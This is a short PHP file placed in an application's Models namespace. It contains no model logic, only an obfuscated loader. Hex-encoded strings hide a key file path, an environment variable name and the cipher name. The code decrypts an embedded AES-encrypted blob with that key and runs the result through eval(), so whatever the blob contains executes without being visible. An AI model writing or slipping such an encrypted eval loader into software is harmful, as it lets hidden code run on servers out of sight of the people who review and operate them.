<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('O6ti/REqYAJJICXs+uJjAA==');

$c=base64_decode(

'CxQcBXYtQi9A+N3kRSqKkYAuyab/m0YlkhEe16UtmkNtz8LoyOkVhhw9FXHARrjjhAOtZ6ZjUbKc' .
'0wTsL6EijD8DMlCDrRYfCyaBiQM47LZ1hbSNvWSGfS8/0HmTeLVRceDWnPoGvsk8ll79lqqxDbuv' .
'hqSOzw/fhHP8kV4JPpbj3xJtbhtS4TEoIImBl2CWPrgAIGFhfx9jmpSvDlaJzLMfEvks3iwC7SIb' .
'usuMVlR27fLUin5SQbW+OrRnOeDNOggss1tEICZpArunjiRg/ziVN5vrhYqFsOZrFz3T+8wMW1j4' .
'rMqokNMFDGUyByRFI5v9ZSD2/ZwBrCbsi5QKZAKHctj4f0XaF39b30dtqLrwUd1JRxJGQMgDwmfq' .
'vlNFFC63Vh2kDEjAdzMD7KjhMfnYbbkzNX6JwI0fl3G3c+yhwtdAkt26M4ou4tluje6EEiGRcMGU' .
'gtpw92d7cHYdPS1sD+7BDN0NzUx7lWp9l0829foFuCpVMR4s2Wq1VYj2isypyW2bZgZYTKftpNKZ' .
'JC4mdJPONoP+mSqLOo5iuV0+Xaey41ue/n5s6VwA0mpMAMYLehp3vG1gJmeqRC2NiyQXMvPHvBZ5' .
'pPhoVv0T6jrIBhltb9itXq2sQzKreeu58uFxTMgkRJHCgaSwZjqs0TT1dHx2ZzNC+8OWvWAnUz+z' .
'4qfLsH6mqXC2Q8O1YEpu8dn67vYedkP9mhESH75AdkzN8D58U3Hvr8KH568S0JODuYNruhC81Azf' .
'/WklNzTyUcWEdmxrDtB5juVhIqpJIA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

